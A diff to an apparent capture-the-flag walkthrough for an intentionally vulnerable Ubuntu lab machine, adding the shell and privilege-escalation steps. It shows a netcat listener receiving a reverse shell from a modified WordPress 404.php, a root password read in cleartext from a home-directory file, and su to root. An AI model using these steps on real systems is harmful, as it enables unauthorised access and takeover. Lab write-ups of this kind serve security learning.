@@ -106,16 +106,46 @@ and a netcat listener to get the shell
 
 ### 3.Gaining Shell
 
-After uploading the shellm, navigate to `http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php` and you will get the shell :
+After uploading the shell, navigate to `http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php` and you will get the shell :
 
 ```bash
+root@kali: nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 57284
+Linux ubuntu-extermely-vulnerable-m4ch1ine 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 06:28:54 up 35 min,  0 users,  load average: 0.02, 0.86, 1.07
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
 
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
+### 4.Privilege Escalation
 
+Try to enumerate the system with `linpease.sh` and it finds a password file in home directory under `/home/root3r/.root_password_ssh.txt` which contains the root password :
 
+```bash
+www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ cat .root_password_ssh.txt 
+willy26
+```
 
+now just switch to root account :
 
+```bash
+www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ su root
+Password:
+
+root@ubuntu-extermely-vulnerable-m4ch1ine:~# ls
+proof.txt
+
+root@ubuntu-extermely-vulnerable-m4ch1ine:~# cat proof.txt 
+voila you have successfully pwned me :) !!!
+:D
+```
+
+This is how you can get root on this machine :)
 
 
 
